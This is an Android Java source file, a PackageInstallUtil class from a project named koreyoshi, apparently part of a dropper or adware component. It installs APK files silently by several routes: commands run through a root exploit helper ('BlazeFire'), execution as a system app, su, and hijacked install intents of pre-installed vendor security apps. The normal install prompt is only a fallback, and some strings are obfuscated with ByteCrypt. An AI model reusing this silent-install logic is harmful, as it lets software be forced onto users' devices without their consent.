package com.curtain.koreyoshi.utils;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.common.crypt.ByteCrypt;
import com.curtain.arch.MyLog;
import com.curtain.koreyoshi.init.Constants;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by leejunpeng on 2015/10/26.
 */
public class PackageInstallUtil {
    private static final String TAG = PackageInstallUtil.class.getSimpleName();

    /**
     * 判断apk是否设置为指定安装在内置存储空间中
     * @param context
     * @param filePath
     * @return
     */
    public static boolean appInstallIsInternal(Context context,String filePath){
        PackageManager pm = context.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(filePath,PackageManager.GET_SERVICES);
        int mInstallLocation = info.installLocation;
        if(mInstallLocation == PackageInfo.INSTALL_LOCATION_INTERNAL_ONLY){
            return true;
        }
        return false;
    }


    public static boolean isValideApkFile(Context context, String file){
        PackageManager pm = context.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(file, PackageManager.GET_SERVICES);
        return info != null;
    }

    public static String getPname(Context context, String file){
        PackageManager pm = context.getPackageManager();
        PackageInfo info = pm.getPackageArchiveInfo(file, PackageManager.GET_SERVICES);
        return info == null ? "" : info.packageName;
    }


    public static boolean getInstallFlags(Context context,String pname){
        PackageManager pm = context.getPackageManager();
        try {
          PackageInfo pi = pm.getPackageInfo(pname,0);
            if(pi != null) {
                return true;
            }
        } catch (NameNotFoundException e) {
        }

        return false;
    }


    private static final String SECURITY_ACTION_OLD = "android.ibingo.action.BIND_APPWIDGET";
    private static final String SECURITY_ACTION = "android.security.action.BIND_APPWIDGET";
    private static final String FUNCTION_INSTALL = "install";

    //安装APP
    public static void installAppByPinku(Context context, String filePath) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo archiveInfo = pm.getPackageArchiveInfo(filePath,PackageManager.GET_SERVICES);
            String packageName = "";
            if (archiveInfo != null) {
                packageName = archiveInfo.packageName;
            }
            //检查BingoSecurity是否存在
            //1.com.ibingo.security
            //2.com.android.security
            //3.com.android.donut
            //4.com.android.eclair
            PackageManager packageManager = context.getPackageManager();
            Intent sendIntent = null;

            List<String> pkgs = new ArrayList<String>();
            pkgs.add("com.ibingo.security");
            pkgs.add("com.android.security");
            pkgs.add("com.android.donut");
            pkgs.add("com.android.eclair");
            pkgs.add("com.android.attachwidget");
            for(int i=0;i<pkgs.size();i++){
                if(checkPackage(context, pkgs.get(i))){
                    Log.i("cc","the：" + pkgs.get(i).toString() + " has existed...");
                    if(packageManager.checkPermission("android.permission.INSTALL_PACKAGES", pkgs.get(i)) == PackageManager.PERMISSION_GRANTED){
                        Log.i("cc","android.permission.INSTALL_PACKAGES is OK");
                        List<ResolveInfo> infos = packageManager.queryIntentActivities(new Intent(SECURITY_ACTION_OLD), 0);
                        if(infos!=null&&infos.size()>0){
                            Log.i("cc","queryIntentActivities:new Intent(SECURITY_ACTION_OLD) is OK");
                            sendIntent = getBingoInstallIntent(context,SECURITY_ACTION_OLD,filePath);
                        }else{
                            infos = packageManager.queryIntentActivities(new Intent(SECURITY_ACTION), 0);
                            if(infos!=null&&infos.size()>0){
                                Log.i("cc","queryIntentActivities:new Intent(SECURITY_ACTION) is OK");
                                sendIntent = getBingoInstallIntent(context,SECURITY_ACTION,filePath);
                            }
                        }
                    }
                    break;
                }
            }
            if(sendIntent != null){
                Log.i("cc","sendBingoInstall......");
                context.startActivity(sendIntent);
            }else{
                Log.i("cc","installAppByCallSystemIntent......");
                installAppByCallSystemIntent(context,filePath);
            }
            Thread.sleep(3000);
        } catch (Exception e) {
        }
    }

    /**

     * 检测该包名所对应的应用是否存在

     * @param packageName

     * @return

     */

    public static boolean checkPackage(Context context, String packageName) {
        if (packageName == null || "".equals(packageName)) {
            return false;
        }
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(packageName, PackageManager.GET_UNINSTALLED_PACKAGES);
            if(appInfo!=null){
                return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }



    public static Intent getBingoInstallIntent(Context context,String action,String filePath){
        Intent newIntent = new Intent(action);
        newIntent.putExtra("function", FUNCTION_INSTALL);
        newIntent.putExtra("path", filePath);
        newIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        return newIntent;
    }



    /**
     * 使用3个方法，安装apk
     * @param context
     * @param targetFile
     */
    public static void installApp(Context context, File  targetFile) {
//        MyLog.e(TAG,"installApp installApp : " + filePath);
        try {

            String filePath = targetFile.getAbsolutePath();

            PackageManager pm = context.getPackageManager();
            PackageInfo archiveInfo = pm.getPackageArchiveInfo(filePath,PackageManager.GET_SERVICES);
            String packageName = "";
            if (archiveInfo != null) {
                packageName = archiveInfo.packageName;
            }
            String cmd = ByteCrypt.getString("pm install -r -l ".getBytes()) + filePath;
            if (installByBlzeF(cmd,false)) { // 使用 bz 安装成功
//                MyLog.e(TAG,"installApp installByBlzeF : " + filePath);
                sendInsBroad(context,packageName);
                return;
            }
            if (installBySystemApp(context, cmd)) {
//                MyLog.e(TAG,"installApp installBySystemApp : " + filePath);
                sendInsBroad(context,packageName);
                return;
            }

            try {
                if (installBySu(cmd)) {
//                    MyLog.e(TAG,"installApp installBySu : " + filePath);
                    sendInsBroad(context,packageName);
                    return;
                }
            } catch (RuntimeException e) {
                installAppByCallSystemIntent(context, filePath);
                return;
            }

            installAppByCallSystemIntent(context, filePath);

            Thread.sleep(3000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendInsBroad(Context context, String packageName){
        Intent packageAdd = new Intent(Constants.MY_PACKAGE_ADDED_ACTION);
        packageAdd.putExtra(ByteCrypt.getString("package".getBytes()), packageName);
        context.sendBroadcast(packageAdd);
    }


    // 使用 bz EP进行安装，安装成功返回true, 否则返回false

    public static boolean installByBlzeF(String cmd,boolean install2SdCard) {
        boolean blazeFireHasRoot = EPUtil.getInstance().hasRoot();
        MyLog.d(TAG,"installAppByBlzeFire has root : " + blazeFireHasRoot);
        if (blazeFireHasRoot && !install2SdCard) {
            String blazeFireInstallResult = EPUtil.getInstance().makeCmd("LD_LIBRARY_PATH=/vendor/lib:/system/lib " + cmd);
            if (blazeFireInstallResult != null && "Success".equalsIgnoreCase(blazeFireInstallResult.trim())) {
                return true;
            }else if(!TextUtils.isEmpty(blazeFireInstallResult) && blazeFireInstallResult.contains("INSTALL_FAILED_INSUFFICIENT_STORAGE")){
                return installByBlzeF(cmd,true);
            }
        }
        else if(install2SdCard && blazeFireHasRoot){
            if(!TextUtils.isEmpty(cmd)){
                String ncmd = cmd.replace("-l","-s");
                String blazeFireInstallResult = EPUtil.getInstance().makeCmd("LD_LIBRARY_PATH=/vendor/lib:/system/lib " + ncmd);
                if (blazeFireInstallResult != null && "Success".equalsIgnoreCase(blazeFireInstallResult.trim())) {
                    return true;
                }
            }

        }

        return false;

    }

    public static boolean installBySystemApp(Context context, String cmd) {
        if(isSystemApp(context, context.getPackageName())) {


            ShellUtils.CommandResult mCommandResult =  ShellUtils.execCommand(cmd,false);
            String successMsg = mCommandResult .successMsg;
            String errorMsg =  mCommandResult.errorMsg;
            if(!TextUtils.isEmpty(successMsg) && successMsg.equalsIgnoreCase("success")){
                return true;
            }else if(!TextUtils.isEmpty(errorMsg) && errorMsg.contains("INSTALL_FAILED_INSUFFICIENT_STORAGE")){
                return installApp2SdCard(cmd,false);
            }
        }
        return false;


    }

    public static boolean isSystemApp(Context context, String packageName) {
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName,PackageManager.GET_SERVICES);
            int flag = packageInfo.applicationInfo.flags;
            return ((flag & ApplicationInfo.FLAG_SYSTEM) == 1);
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    public static boolean installApp2SdCard(String cmd,boolean hasRoot){
        if(!TextUtils.isEmpty(cmd)){
            cmd = cmd.replace("-l","-s");
        }
        MyLog.e(TAG,"installApp2SdCard newcmd : " + cmd);
        ShellUtils.CommandResult mCommandResult =  ShellUtils.execCommand(cmd,hasRoot);
        String successMsg = mCommandResult .successMsg;
        String errorMsg =  mCommandResult.errorMsg;
        if(!TextUtils.isEmpty(successMsg) && successMsg.equalsIgnoreCase("success")){
            return true;
        }
        return false;
    }




    public static void installAppByCallSystemIntent(Context context,String filePath) {
//        MyLog.e(TAG,"installAppByCallSystemIntent filePath : " + filePath );
        File apk = new File(filePath);
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apk),
                ByteCrypt.getString("application/vnd.android.package-archive".getBytes()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (intent.resolveActivity(context.getPackageManager()) != null) {
            context.startActivity(intent);
        }else {
            MyLog.d(TAG,ByteCrypt.getString("no intent action view !!!".getBytes()));
        }
    }

    public static void openApp(Context context, String mPackageName){
        PackageManager packageManager = context.getPackageManager();
        Intent intent = packageManager.getLaunchIntentForPackage(mPackageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    // 请求系统root权限进行安装，安装成功返回true, 否则返回false
    // ****** 可能抛出RuntimeException
    public static boolean installBySu(String cmd) {
        ShellUtils.CommandResult mCommandResult =  ShellUtils.execCommand(cmd,true);
        String successMsg = mCommandResult .successMsg;
        String errorMsg =  mCommandResult.errorMsg;

        if(!TextUtils.isEmpty(successMsg) && successMsg.equalsIgnoreCase("success")){
            return true;
        }else if(!TextUtils.isEmpty(errorMsg) && errorMsg.contains("INSTALL_FAILED_INSUFFICIENT_STORAGE")){
            return installApp2SdCard(cmd,true);
        }
        return false;
    }

}
